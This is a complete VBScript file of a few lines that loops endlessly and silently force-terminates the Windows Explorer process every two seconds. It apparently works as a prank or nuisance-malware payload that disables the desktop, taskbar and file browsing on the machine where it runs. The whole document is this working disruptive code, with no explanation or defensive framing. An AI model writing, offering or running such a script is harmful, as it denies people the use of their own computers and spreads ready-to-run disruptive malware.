Set objShell = WScript.CreateObject("WScript.Shell")

Do
    objShell.Run "taskkill /f /im explorer.exe", 0, True
    WScript.Sleep 2000
Loop
